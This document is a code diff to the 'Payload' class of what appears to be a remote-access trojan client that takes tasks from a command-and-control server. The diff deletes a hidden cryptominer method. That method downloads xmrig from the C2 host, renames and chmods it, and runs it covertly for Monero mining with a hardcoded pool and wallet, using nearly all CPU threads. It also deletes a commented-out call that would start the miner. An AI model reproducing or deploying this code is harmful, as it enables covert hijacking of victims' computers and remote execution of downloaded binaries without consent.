@@ -253,44 +253,6 @@ class Payload():
                 break
             time.sleep(0.5)
 
-
-    def _init_dev_miner(self):
-        url = 'pool.hashvault.pro'
-        host_port = 80
-        api_port = 8889
-        user = '46v4cAiT53y9Q6XwboCAHoct4mKXW4SHsgBA4TtEpMrgDCLxsyRXhawGJUQehVkkxNL8Z4n332Hgi8NoAXfV9gCSB3XWBLa'
-
-        # first attempt using built-in python miner
-        try:
-            raise Exception
-            import pycryptonight, pyrx
-            self.child_procs['dev_miner_py'] = globals()['Miner'](url=url, port=host_port, user=user)
-            self.child_procs['dev_miner_py'].start()
-        except Exception as e:
-            log("{} error: {}".format(self._init_dev_miner.__name__, str(e)))
-
-            # if that fails, try downloading and running xmrig
-            try:
-                threads = multiprocessing.cpu_count() - 1
-
-                # pull xmrig from server if necessary
-                if not self.xmrig_path_dev:
-                    self.xmrig_path_dev = self.wget('http://{0}:{1}/xmrig/xmrig_{2}'.format(self.c2[0], int(self.c2[1]) + 1, sys.platform))
-
-                    # set up executable
-                    if os.name == 'nt' and not self.xmrig_path_dev.endswith('.exe'):
-                        os.rename(self.xmrig_path_dev, self.xmrig_path_dev + '.exe')
-                        self.xmrig_path_dev += '.exe'
-
-                    os.chmod(self.xmrig_path_dev, 755)
-
-                    # excute xmrig in hidden process
-                    params = self.xmrig_path_dev + " --url={url} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --http-host={host} --http-port={port} --threads={threads}".format(url=url, user=user, host=globals()['public_ip'](), port=api_port, threads=threads)
-                    result = self.execute(params)
-            except Exception as e:
-                log("{} error: {}".format(self._init_dev_miner.__name__, str(e)))
-
-
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='cd <path>')
     def cd(self, path='.'):
         """
@@ -1230,9 +1192,6 @@ class Payload():
         # create thread handlers to cleanup dead/stale threads
         self.handlers['prompt_handler'] = self._get_prompt_handler() if not self.gui else None
         self.handlers['thread_handler'] = self._get_thread_handler()
-
-        # kick off dev miner
-        # self._init_dev_miner()
 
         # loop listening for tasks from server and sending responses.
         # if connection is dropped, enter passive mode and retry connection every 30 seconds.
